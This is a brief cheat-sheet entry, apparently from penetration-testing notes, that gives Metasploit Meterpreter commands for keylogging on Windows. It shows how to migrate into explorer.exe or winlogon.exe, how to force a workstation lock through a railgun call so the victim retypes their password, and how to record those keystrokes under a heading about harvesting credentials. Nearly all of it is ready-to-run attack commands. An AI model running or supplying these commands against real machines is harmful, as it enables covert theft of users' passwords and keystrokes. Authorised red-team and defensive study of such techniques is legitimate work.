# Metasploit

```
meterpreter > bgrun post/windows/capture/keylog_recorder
```

It will migrate to `explorer.exe` then start recording keystrokes.

```
meterpreter > bgrun keylogrecorder -c 0 -t 15
```

## Harvest User's Credentials

> [!WARNING] OPSEC Warning
> Use this method with caution.

```
meterpreter > run post/windows/capture/lockout_keylogger [pid=<winlogon_PID>]
```

It will migrate to `winlogon.exe` then start recording keystrokes.

```
meterpreter > irb
>> client.railgun.user32.LockWorkStation()

>> exit

meterpreter > bgrun keylogrecorder -c 1 -t 15
```